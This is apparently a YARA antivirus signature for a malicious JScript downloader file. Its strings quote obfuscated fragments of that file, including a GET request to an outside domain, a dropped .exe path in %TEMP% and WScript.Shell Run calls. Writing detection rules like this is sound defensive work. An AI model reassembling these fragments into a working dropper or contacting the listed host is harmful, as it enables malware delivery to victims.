rule sig_20160328_91fe68e139b950f95a779ea9be00bcc6 {
  meta:
    description = "datamaliciousorder - file 20160328_91fe68e139b950f95a779ea9be00bcc6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3bb5345d8173e5fb70a13d29f5da78dce1ab46314f4c039a26b442c9859aee7b"

  strings:
    $s1  = "function Iaeulaeuw() {return Zozygaqt[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Gqv7hrtsVbzLfR.exe\";};" fullword ascii
    $s2  = "Uxspkvby[Qmuzibteg](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Kmokhbp](Rbfoc() * 11)} while (Uxspkvby[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Xvugto(Rmalprom, Hjzlyged){return Rmalprom - Hjzlyged;};" fullword ascii
    $s5  = "var Zozygaqt = function Wfgsigte() {return WScript[Bsknwilhd](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Nftltwooys(Yhydn){Zozygaqt[\"Run\"](Yhydn, Erhpackn, Erhpackn);};" fullword ascii
    $s7  = "function Svwhhsbjy() {return ((Ghvxqqfwvm == true) && (Ghvxqqfwvm == Wllrhivw)) ? 1 : Erhpackn;};" fullword ascii
    $s8  = "function Qyinfsgnnf()" fullword ascii
    $s9  = "function Nyeak(){return Bsknwilhd;};" fullword ascii
    $s10 = "var Ghvxqqfwvm = false;" fullword ascii
    $s11 = "Wllrhivw = true; " fullword ascii
    $s12 = "Ghvxqqfwvm = true; " fullword ascii
    $s13 = " while (Kttwvsg){" fullword ascii
    $s14 = "var Kstudrco = new this[\"Date\"]();" fullword ascii
    $s15 = "function Rbfoc(){return 22;};" fullword ascii
    $s16 = "function Ywhvjefpr(Soralixki) {var Hgxwm = (1, 2, 3, 4, 5, Soralixki); return Hgxwm;};" fullword ascii
    $s17 = "var Wllrhivw = false;" fullword ascii
    $s18 = "return Xvugto(Ecdifjxa, Oxgylbpxz);" fullword ascii
    $s19 = "var Qjdcpu = false;" fullword ascii
    $s20 = "function Owkwcxgl(){return Niwwy;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}